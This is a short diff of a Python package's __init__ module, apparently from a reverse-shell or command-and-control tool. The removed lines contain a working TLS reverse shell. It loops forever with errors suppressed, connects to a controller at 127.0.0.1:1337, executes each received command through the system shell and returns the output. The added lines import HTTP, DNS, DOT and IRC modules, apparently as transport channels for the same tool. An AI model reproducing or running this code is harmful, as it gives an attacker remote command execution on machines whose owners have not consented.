@@ -45,38 +45,17 @@ under certain conditions.
 __license__ = license
 __copyright__ = copyright
 
-__all__ = []
+defaults = dir()
 
-print(copyright)
+from .http import HTTP
+from .dns import DNS
+from .dot import DOT
+from .irc import IRC
 
-from os.path import join
-from socket import socket
-from contextlib import suppress
-from subprocess import run, PIPE
-from ssl import SSLContext, PROTOCOL_TLS_CLIENT
+__all__ = protocols = list({
+    x.upper()
+    for x in dir()
+    if x not in defaults and x not in {"defaults", "utils", "base"}
+})
 
-context = SSLContext(PROTOCOL_TLS_CLIENT)
-context.load_verify_locations(join("..", "server.crt"))
-
-
-def sendall(data):
-    chunk = data[:30000]
-    data = data[30000:]
-    while chunk:
-        ss.sendall(chunk)
-        chunk = data[:30000]
-        data = data[30000:]
-
-
-data = b" "
-while True:
-    with suppress(Exception):
-        s = socket()
-        ss = context.wrap_socket(s, server_hostname="localhost")
-        ss.connect(("127.0.0.1", 1337))
-        sendall(data)
-        command = ss.recv(65535).decode()
-        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
-        data = p.stdout or p.stderr or b" "
-        ss.close()
-        s.close()
+__all__.append("protocols")
